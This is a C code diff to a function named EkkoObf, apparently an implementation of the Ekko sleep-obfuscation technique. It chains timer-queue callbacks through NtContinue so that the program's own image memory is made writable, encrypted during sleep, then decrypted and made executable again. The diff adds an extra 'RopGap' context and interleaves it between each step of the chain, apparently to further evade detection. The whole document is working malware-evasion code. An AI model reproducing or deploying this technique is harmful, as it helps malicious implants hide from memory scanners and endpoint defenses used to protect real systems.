@@ -11,6 +11,7 @@ VOID EkkoObf( DWORD SleepTime )
     CONTEXT RopMemDec   = { 0 };
     CONTEXT RopProtRX   = { 0 };
     CONTEXT RopSetEvt   = { 0 };
+	CONTEXT RopGap   = { 0 };
 
     HANDLE  hTimerQueue = NULL;
     HANDLE  hNewTimer   = NULL;
@@ -54,6 +55,15 @@ VOID EkkoObf( DWORD SleepTime )
         memcpy( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
         memcpy( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );
         memcpy( &RopSetEvt, &CtxThread, sizeof( CONTEXT ) );
+		memcpy( &RopGap, &CtxThread, sizeof( CONTEXT ) );
+
+
+		// WaitForSingleObject( hTargetHdl, SleepTime );
+        RopGap.Rsp   -= 8;
+        RopGap.Rip    = WaitForSingleObject;
+        RopGap.Rcx    = NtCurrentProcess();
+        RopGap.Rdx    = 10;
+
 
         // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
         RopProtRW.Rsp  -= 8;
@@ -97,11 +107,21 @@ VOID EkkoObf( DWORD SleepTime )
         puts( "[INFO] Queue timers" );
 
         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopMemEnc, 300, 0, WT_EXECUTEINTIMERTHREAD );
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopDelay,  500, 0, WT_EXECUTEINTIMERTHREAD );
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopMemDec, 700, 0, WT_EXECUTEINTIMERTHREAD );
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopProtRX, 900, 0, WT_EXECUTEINTIMERTHREAD );
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopSetEvt, 1000, 0, WT_EXECUTEINTIMERTHREAD );
+		CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopGap, 110, 0, WT_EXECUTEINTIMERTHREAD );
+
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
+		CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopGap, 210, 0, WT_EXECUTEINTIMERTHREAD );
+
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
+		CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopGap, 310, 0, WT_EXECUTEINTIMERTHREAD );
+
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
+		CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopGap, 410, 0, WT_EXECUTEINTIMERTHREAD );
+
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
+		CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopGap, 510, 0, WT_EXECUTEINTIMERTHREAD );
+
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );
 
         puts( "[INFO] Wait for hEvent" );
 
